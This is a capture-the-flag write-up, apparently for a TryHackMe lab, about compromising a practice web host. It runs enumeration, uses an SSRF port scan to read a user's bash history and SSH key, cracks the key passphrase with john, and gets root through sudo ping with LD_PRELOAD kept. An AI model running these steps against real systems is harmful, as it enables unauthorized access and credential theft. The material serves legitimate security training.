Exploit a vulnerable web application and some misconfigurations to gain root privileges.

## Recon

```sh
└─# ffuf -u http://creative.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt 
assets

```

```sh
# gobuster vhost -u "http://creative.thm" -w /usr/share/wordlists/Seclist/subdomains.txt --append-domain -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://creative.thm
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/Seclist/subdomains.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: beta.creative.thm Status: 200 [Size: 591]


```

found url tester on it 

ssrf

```sh
 ffuf -u 'http://beta.creative.thm/' -d "url=http://localhost:FUZZ/" -w <(seq 1 65535) -H 'Content-Type: application/x-www-form-urlencoded' -fs 13   
1337                    [Status: 200, Size: 1143, Words: 40, Lines: 39, Duration: 1651ms]

```

In Burp

```sh
url=http%3A%2F%2Flocalhost%3A1337/home/saad/.bash_history


whoami
pwd
ls -al
ls
cd ..
sudo -l
echo "saad:MyStrongestPasswordYet$4291" > creds.txt
rm creds.txt
sudo -l
whomai
whoami
```

found also id_rsa

```sh

─# john id_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetness        (id_rsa)     
1g 0:00:00:55 DONE (2024-05-07 16:00) 0.01791g/s 17.20p/s 17.20c/s 17.20C/s xbox360..sandy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


```



## Root

```sh
saad@m4lware:~$ sudo -l
Matching Defaults entries for saad on m4lware:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User saad may run the following commands on m4lware:
    (root) /usr/bin/ping

    env_keep+=LD_PRELOAD

User saad may run the following commands on m4lware:
    (root) /usr/bin/ping
saad@m4lware:/tmp/priv$ sudo -u root LD_PRELOAD=/tmp/priv/s.so /usr/bin/ping
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# ls -la

```


Using `LD_PRELOAD`